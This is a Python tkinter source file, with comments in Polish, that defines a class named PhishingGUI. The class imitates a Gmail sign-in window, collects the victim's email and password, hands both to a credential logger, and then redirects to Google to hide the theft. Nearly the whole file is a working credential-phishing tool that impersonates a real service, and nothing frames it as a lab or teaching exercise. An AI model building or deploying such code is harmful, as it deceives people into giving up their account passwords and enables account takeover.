import tkinter as tk
from tkinter import messagebox
from logger import CredentialLogger
from redirector import Redirector
import re

class PhishingGUI:
    def __init__(self):
        self.logger = CredentialLogger()
        self.redirector = Redirector()
        self.root = tk.Tk()
        self.root.title("Gmail - Sign In")
        self.root.geometry('900x600')
        self.setup_ui()

    def setup_ui(self):
        tk.Label(self.root, text="Sign in", font="Helvetica 16").pack(pady=20)

        # Email input
        tk.Label(self.root, text="Email").pack()
        self.email_entry = tk.Entry(self.root, width=40)
        self.email_entry.pack()

        # Przycisk next
        self.next_button = tk.Button(self.root, text="Next", command=self.handle_email_submit)
        self.next_button.pack(pady=20)

    def is_valid_email(self, email):
        return re.match(r"^[\w\.-]+@gmail\.com$", email) is not None

    def handle_email_submit(self):
        self.email = self.email_entry.get()

        if not self.is_valid_email(self.email):
            self.logger.log(self.email, "", is_valid=False)
            messagebox.showerror("Invalid Email", "Please enter a valid Gmail address.")
            return

        # Usuwamy input i przycisk Next
        self.email_entry.pack_forget()
        self.email_label = tk.Label(self.root, text=self.email, font="Helvetica 12 bold")
        self.email_label.pack(pady=5)
        self.next_button.pack_forget()

        # Dodajemy input do hasła
        tk.Label(self.root, text="Password").pack()
        self.password_entry = tk.Entry(self.root, show="*", width=40)
        self.password_entry.pack()

        self.login_button = tk.Button(self.root, text="Login", command=self.handle_password_submit)
        self.login_button.pack(pady=20)

    def handle_password_submit(self):
        password = self.password_entry.get()

        if not password:
            messagebox.showerror("Invalid Password", "Password cannot be empty.")
            return

        # Logujemy dane
        self.logger.log(self.email, password, is_valid=True)

        self.root.destroy()
        self.redirector.redirect_to_google()

    def run(self):
        self.root.mainloop()
